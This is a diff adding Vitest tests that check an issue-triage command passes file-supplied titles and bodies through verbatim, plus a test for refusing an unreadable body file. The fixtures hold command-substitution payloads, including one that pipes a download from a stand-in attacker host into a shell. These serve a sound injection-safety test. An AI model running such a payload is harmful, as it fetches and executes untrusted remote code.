@@ -1,3 +1,6 @@
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import path from 'node:path'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import type * as ConfigHelpers from '../../shared/adapters/config-helpers'
 
@@ -147,6 +150,45 @@ describe('issue-triage/create > basic creation', () => {
     expect(mockCreateGitHubIssue).toHaveBeenCalled()
     expect(mockAddSubIssue).toHaveBeenCalledWith('node-163', 'node-99')
     expect(exitSpy).toHaveBeenCalledWith(1)
+  })
+})
+
+describe('issue-triage/create > title and body from files', () => {
+  let dir: string
+  beforeEach(() => {
+    setupMocks()
+    dir = mkdtempSync(path.join(tmpdir(), 'triage-create-'))
+  })
+  afterEach(() => {
+    vi.restoreAllMocks()
+    rmSync(dir, { recursive: true, force: true })
+  })
+
+  it('passes shell metacharacters through verbatim', async () => {
+    // The text fix files comes from PR comments; on argv it would need shell
+    // quoting, where $(…) and backticks still run.
+    const title = path.join(dir, 'title.txt')
+    const body = path.join(dir, 'body.md')
+    writeFileSync(title, 'lockfile drift $(touch pwned)\n')
+    writeFileSync(body, '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n')
+    await createIssue(['--title-file', title, '--body-file', body])
+    expect(mockCreateGitHubIssue).toHaveBeenCalledWith(
+      'lockfile drift $(touch pwned)',
+      '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n',
+      undefined,
+    )
+  })
+
+  it('refuses an unreadable body file before the issue is created', async () => {
+    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
+      throw new Error(`process.exit:${code}`)
+    }) as never)
+    const errors: string[] = []
+    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
+    await createIssue(['--title', 'Test', '--body-file', path.join(dir, 'missing.md')]).catch(() => {})
+    expect(exitSpy).toHaveBeenCalledWith(1)
+    expect(mockCreateGitHubIssue).not.toHaveBeenCalled()
+    expect(errors.some((m) => m.includes('--body-file cannot read'))).toBe(true)
   })
 })
 
